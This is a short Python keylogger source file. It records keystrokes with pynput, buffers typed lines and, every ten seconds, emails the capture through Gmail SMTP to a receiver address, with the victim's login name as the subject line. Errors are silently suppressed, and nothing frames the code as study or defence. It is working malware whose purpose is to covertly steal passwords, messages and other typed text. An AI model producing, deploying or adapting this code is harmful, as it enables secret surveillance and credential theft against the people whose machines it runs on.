from pynput.keyboard import Key, Listener
import time
import smtplib

list_log = []
main_string = ""  # All the key presses are stored in this string
curr_time = time.time()

delay = 10

username = ""
password = ""
receiver_mail = ""

def send_mail():
    global main_string,username,password,receiver_mail
    username = ""
    try:
        import os
        user = os.getlogin()
    except:
        pass
    try:
        message = "Subject: " + user + "\n\n" + str(main_string)    # Subject is the name of the victim
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(username,password)
        server.sendmail(username, receiver_mail, message)
        server.quit()
        main_string = ""
    except:
        pass

def write_to_file(key):
    global curr_time,main_string,delay
    for _ in key:
        if _ == "Key.enter":
            main_string += "   \n    "
        elif _ == "Key.space":
            main_string += " "
        else:
            _ = _.replace("'","")
            if _.find("Key") == 0:
                _ =" " + _ + " "
            main_string += _
    if(int(time.time() - curr_time) > delay):
        send_mail()
        curr_time = time.time()

def press(key):
    global list_log
    list_log.append(str(key))
    if(key == Key.esc):
        return False
    elif (key == Key.backspace):
        list_log.pop()
        try:
            list_log.pop()
        except:
            pass
    elif (key == Key.enter):
        write_to_file(list_log)
        list_log = []

if __name__ == "__main__":
    with Listener(on_press = press) as listner:
        listner.join()